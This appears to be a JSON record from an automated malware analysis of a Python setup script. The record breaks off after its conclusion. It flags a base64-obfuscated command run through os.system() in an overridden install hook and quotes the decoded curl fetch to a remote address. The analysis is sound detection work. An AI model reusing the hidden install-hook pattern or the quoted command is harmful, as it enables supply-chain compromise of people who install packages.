{
  "purpose": "The code defines a setup script for a Python package, with additional commands that execute during installation or development setup.",
  "sources": "The base64-encoded string in b64d() function, which is decoded and executed via os.system() in notmalfunc().",
  "sinks": "The decoded string executes a system command; the most critical sink is os.system() executing a decoded command, which performs a network request.",
  "flows": "The base64 string is decoded and passed directly to os.system(), executing an external command during package installation.",
  "anomalies": "Use of base64 decoding to obfuscate the command; the command is a cURL request to an external IP, indicating possible malicious intent. No user input involved, but the command's purpose is suspicious.",
  "analysis": "The script imports setuptools and overrides install and develop commands to execute additional code during installation. The function b64d() decodes a base64 string. The string decodes to 'curl -s http://192.168.1.34:8000/test.txt | base', which is a network request to an external server, potentially for malicious purposes. This command is executed in the notmalfunc() function, which runs during the 'install' process. The use of base64 encoding suggests an attempt to hide malicious activity. No other suspicious code or hardcoded credentials are present. The code does not involve obfuscated bytecode but does contain obfuscated commands.",
  "conclusion": "This package includes malicious behavior by executing a hidden network request during installation, likely for malicious data exfiltration or command and control purposes. The obfuscation and external request are significant indicators of malicious intent.",
